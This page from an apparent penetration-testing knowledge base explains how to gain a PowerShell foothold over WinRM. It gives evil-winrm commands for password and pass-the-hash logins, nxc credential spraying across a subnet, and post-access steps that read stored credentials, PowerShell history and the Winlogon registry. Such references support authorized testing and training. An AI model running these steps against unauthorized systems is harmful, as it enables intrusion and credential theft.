---
id: winrm
title: WinRM Access
stage: foothold
tags: [windows, ad, winrm]
summary: Get a PowerShell session over WinRM with evil-winrm — supports password and hash auth, and is the fastest path to an interactive Windows shell without needing a GUI.
leads_to:
  - token-impersonation
  - windows-stored-creds
  - windows-sebackup
  - acl-abuse
  - dcsync
  - kerberos-delegation
  - laps-abuse
  - windows-gpp-creds
  - windows-uac-bypass
  - bloodhound
  - windows-service-misconfig
  - windows-dll-hijack
---

## Prerequisites

Port 5985 (HTTP) or 5986 (HTTPS) open. User must be in the `Remote Management Users` group or local Administrators. Verify access with `nxc winrm` before connecting — "Pwn3d!" in the output confirms the user can WinRM in.

WinRM is the go-to shell for Windows AD environments — evil-winrm handles both password and NTLM hash auth, making it usable directly after a hash dump without cracking. It's a PowerShell session with upload/download built in. Run `whoami /all` immediately on landing to see your privileges and group memberships.

## Quick Win

> Check access with nxc first, then connect — "Pwn3d!" in output means you're in.

```bash
nxc winrm $IP -u $USER -p $PASS
evil-winrm -i $IP -u $USER -p $PASS
```

## Connect

> Password, hash, and HTTPS variants.

```bash
evil-winrm -i $IP -u $USER -p $PASS
evil-winrm -i $IP -u $USER -H $NTLM_HASH
evil-winrm -i $IP -u $USER -p $PASS -S
```

## Spray Credentials

> Test one credential against all WinRM hosts — catches local admin password reuse.

```bash
nxc winrm $IP -u users.txt -p passwords.txt --continue-on-success
nxc winrm 192.168.x.0/24 -u Administrator -H $NTLM_HASH --local-auth
```

## After Landing

> Run all of these immediately — covers privileges, stored creds, and network context.

```powershell
whoami /all
whoami /priv
net localgroup Administrators
ipconfig /all
netstat -ano
cmdkey /list
(Get-PSReadlineOption).HistorySavePath
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Leads To

`whoami /priv` shows SeImpersonatePrivilege → token-impersonation → GodPotato for SYSTEM. `cmdkey /list` shows stored credentials → windows-stored-creds. Domain-joined machine → run SharpHound → bloodhound for AD attack paths. Additional subnets in `ipconfig /all` → pivot node to reach internal services.
